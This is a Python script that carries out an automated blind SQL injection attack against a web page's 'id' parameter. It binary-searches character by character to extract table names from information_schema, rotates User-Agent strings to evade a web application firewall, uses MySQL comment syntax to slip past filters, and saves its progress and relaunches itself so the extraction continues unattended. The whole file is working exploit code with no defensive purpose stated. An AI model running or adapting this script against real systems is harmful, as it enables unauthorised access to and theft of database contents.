import requests
import random
import urllib.parse as urltools
import string
import os

"Method to clear the results"
def clear():
	os.system('clear')

"Method to get an ordered set of ASCII characters" 
def GetOrderedASCIIChars():
	candidateChars = string.punctuation + string.digits + string.ascii_letters + string.whitespace
	candidateChars = list(candidateChars)
	candidateChars.sort()
	candidateChars = ''.join(candidateChars)
	#Some characters are not acceptable by the database => invalid characters => we remove them from the set of possible characters
	candidateChars = candidateChars.replace('&','').replace('\'','').replace('#','').replace('%','')
	return candidateChars

url = "https://example.com/article"

##To prevent WAF from blocking the request
headers = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.39', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.72 Mobile Safari/537.36 OPR/19.0.1340.71596']

Headers = {'User-Agent': headers[random.randint(0,1)]}

tables_nb = 5 #Identified by means of an SQL Injection

new_characters = GetOrderedASCIIChars()

file_name = "data.txt" #File to store the progress
##Code to resume data collecting from where it stopped
file = open(file_name, 'a+') #"a" to append (to create the file in case it does not exist instead of throwing an error) and "+" to enable both read and write modes (to be able to read essentially at this stage)
new_query = file.read().strip()
new_query = list(new_query)

##Code to blindly extract data from the database
try:
	while True:
		search_range = new_characters
		position = len(new_query)+1
		while len(search_range) > 0:
			charac = search_range[len(search_range)//2]

			#====================================================TABLES==================================================
			# #USED TO EXTRACT ALL THE TABLES FROM A CHOSEN DATABASE, OR ALL(For this, I must remove "where table_schema like ''" in order to retrieve the tables from all dbs)
			database_name = 'db_ex'

			resp = requests.get(f"{url}?id=1+and+substring((Select export_set(5,@x:=0,(select count(*)from(/*!information_schema*/.tables)where(table_schema like '{database_name}')and@x:=export_set(5,@x,table_name,0x2c,2)),@x,2)),{position},1)='{charac}';", headers = Headers)

			#------------------------------------------------------------------------------------------------------------
			
			##GUESSING ALGORITHM
			print(f"Testing: {''.join(new_query)+charac}") #For Visualization and Debugging
        
            #Case 1: WAF Triggered, in which case we stop the code
			if "Not Acceptable" in str(resp.content) : #Status code is 406: Not Acceptable
				print("WAF in the house") #WAF Detected, a bypass must be figured out
				exit() #Stop running the code because WAF will block all requests if it's not bypassed
            
            #Case 2: WAF Bypassed and the guess is Incorrect, in which case we start running the bruteforce algorithm
			elif resp.status_code==200 and "Example" not in str(resp.content):
				
                #Extract all databases 
				resp = requests.get(f"{url}?id=1+and+substring((Select export_set(5,@x:=0,(select count(*)from(/*!information_schema*/.tables)where(table_schema like '{database_name}')and@x:=export_set(5,@x,table_name,0x2c,2)),@x,2)),{position},1)>'{charac}';", headers = Headers)

				if "Example" not in str(resp.content):
					search_range = search_range[:len(search_range)//2] 
					continue
				# else
				search_range = search_range[len(search_range)//2:]
				continue

            #Case 2: WAF Bypassed and the guess is Correct, in which case we note the character revealed
			elif resp.status_code==200 and "Example" in str(resp.content):
				new_query.append(charac) #Append the character guessed to the list of data collected
				break #Start guessing the next character

            #Case 3: Unknown response (We never know what might happen XD)
			else:
				print("Unexpected Error Occurred!")
			##END GUESSING ALGORITHM
			
#In case of a failure or the code stops running, write the progress to the file and restart the program. This is to automate the attack, to avoid manual restarting
except:
	with open(file_name, 'w') as file:
		new_query = ''.join(new_query)
		file.write(new_query)
	os.system("python script.py")
